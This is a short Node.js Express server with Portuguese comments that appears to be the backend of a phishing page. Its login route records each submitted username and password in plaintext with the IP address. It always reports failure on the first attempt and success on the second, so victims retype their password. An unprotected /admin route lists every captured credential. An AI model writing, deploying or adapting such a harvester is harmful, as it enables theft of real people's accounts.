const express = require("express");
const app = express();

app.use(express.json());
app.use(express.static("public"));

let logs = [];
let tentativas = {}; // guarda tentativas por IP

app.post("/login", (req, res) => {
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const userAgent = req.headers["user-agent"];

  const { usuario, senha } = req.body;

  if (!tentativas[ip]) {
    tentativas[ip] = 0;
  }

  tentativas[ip]++;

  // PRIMEIRA tentativa → erro
  if (tentativas[ip] % 2 === 1) {
    logs.push({ usuario, senha, ip, status: "erro", data: new Date() });

    return res.json({ status: "erro" });
  }

  // SEGUNDA tentativa → sucesso
  logs.push({ usuario, senha, ip, status: "sucesso", data: new Date() });

  return res.json({ status: "ok" });
});

app.get("/admin", (req, res) => {
  res.json(logs);
});

app.listen(3000, () => {
  console.log("🔥 Servidor rodando");
});
